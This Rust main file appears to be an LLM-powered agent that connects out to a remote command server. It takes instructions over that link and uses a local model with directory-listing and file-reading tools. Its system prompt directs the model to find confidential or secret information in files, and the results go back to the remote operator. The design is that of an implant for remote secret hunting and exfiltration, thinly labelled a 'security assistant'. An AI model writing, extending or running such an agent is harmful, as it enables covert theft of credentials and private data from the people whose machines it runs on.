mod antenna;
mod config;
mod util;

use std::error::Error;
use ollama_rs::{
    generation::functions::{request::FunctionCallRequest, tools::Tool, NousFunctionCall},
    Ollama,
};
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use std::sync::Arc;
use clap::Parser;
use ollama_rs::generation::chat::ChatMessage;
use ollama_rs::generation::chat::request::ChatMessageRequest;
use ollama_rs::generation::embeddings::request::{EmbeddingsInput, GenerateEmbeddingsRequest};
use crate::config::Config;
use crate::functions::list_dir::ListDirTool;
use crate::functions::change_dir::CdTool;
use crate::functions::get_cwd::GetCwdTool;
use crate::functions::cat_file::CatTool;

mod functions {
    pub mod get_cwd;
    pub mod change_dir;
    pub mod list_dir;
    pub mod cat_file;
}

static SYSTEM_PROMPT: &str = "You are a security assistant named Llama. Your job is to find confidential or secret information in user files and report it to the user.\
                              Use the functions provided. You MUST be able to answer questions about the files and directories in the current working directory.\
                              If the user asks you a question, do your best to answer based on the information you have about files and directories.";

static MAX_MESSAGES: usize = 10;

#[tokio::main]
async fn main() -> Result<(), Box<dyn Error>> {

    // Automatically parse command-line arguments
    // Try parsing the arguments
    let config = Config::try_parse().unwrap_or_else(|e| {
        // Handle the error (e.g., log the problem)
        eprintln!("Argument parsing error: {e}");
        eprintln!("Using default configuration.");
        // Use the default config instead
        Config::default()
    });


    let ollama = Ollama::new_with_history(
        config.ollama_server,
        config.ollama_port,
        MAX_MESSAGES as u16,
    ); // Point this to your Ollama server

    let mut command_stream = antenna::connect_to_server(config.command_server).await; // Use the command_stream for I/O

    let system_message = ChatMessage::system(SYSTEM_PROMPT.parse().unwrap());
    let all_tools: Vec<Arc<dyn Tool>> = vec![
        // List of all tools
        Arc::new(GetCwdTool),
        Arc::new(CdTool),
        Arc::new(ListDirTool),
        Arc::new(CatTool),
    ];

    // Models
    let model_name = config.ollama_model; // LLM
    let embedding_model_name = config.embedding_model; // Embedding model

    loop {
        // Init parser
        let parser = Arc::new(NousFunctionCall::new());
        let mut query_tools: Vec<Arc<dyn Tool>> = vec![];

        // Write a prompt indicator to the command_stream
        command_stream.write_all(b"\n> ").await?;
        command_stream.flush().await?;

        // Read input from command_stream
        let mut input_buf = vec![0u8; 1024];
        let bytes_read = command_stream.read(&mut input_buf).await?;
        let input = String::from_utf8_lossy(&input_buf[..bytes_read]).trim_end().to_string();

        // Check if we're trying to exit
        if input.eq_ignore_ascii_case("exit") {
            break;
        }

        // Compare tools descriptions to input query
        for tool in all_tools.iter() {
            // Get embeddings of input
            let input_embedding_request = GenerateEmbeddingsRequest::new(
                embedding_model_name.clone().into(),
                vec![input.clone()].into(),
            );
            let input_embedding_response =
                ollama.generate_embeddings(input_embedding_request).await.unwrap();

            // Get embeddings of tool descriptions
            let tool_embedding_request = GenerateEmbeddingsRequest::new(
                embedding_model_name.clone().into(),
                EmbeddingsInput::from(tool.description()),
            );
            let tool_embedding_response =
                ollama.generate_embeddings(tool_embedding_request).await.unwrap();

            // Calculate similarity
            let similarity = util::cosine_similarity(
                &input_embedding_response.embeddings.concat(),
                &tool_embedding_response.embeddings.concat(),
            );

            // If tool description is semantically similar to input
            if similarity > 0.50 {
                query_tools.push(tool.clone());
            }
        }

        // Convert input to ChatMessage
        let input_chat_message = ChatMessage::user(input.parse().unwrap());

        let response;

        // If we have a tool that corresponds to input, run that
        if !query_tools.is_empty() {
            let request = FunctionCallRequest::new(
                model_name.clone().into(),
                all_tools.clone(),
                vec![system_message.clone(), input_chat_message],
            );
            response = ollama.send_function_call(request, parser.clone()).await;
        } else {
            // Otherwise, send input to LLM
            let request = ChatMessageRequest::new(
                model_name.clone().into(),
                vec![system_message.clone(), input_chat_message],
            );
            response = ollama.send_chat_messages(request).await;
        }

        // Write response to the command_stream
        match response {
            Ok(r) => {
                if let Some(content) = r.message.map(|m| m.content) {
                    command_stream.write_all(content.as_bytes()).await?;
                    command_stream.write_all(b"\n").await?; // Ensure a newline for readability
                    command_stream.flush().await?;
                }
            }
            Err(e) => {
                command_stream
                    .write_all(format!("{:#?}\n", e).as_bytes())
                    .await?;
                command_stream.flush().await?;
            }
        }

        query_tools.clear();
    }

    Ok(())
}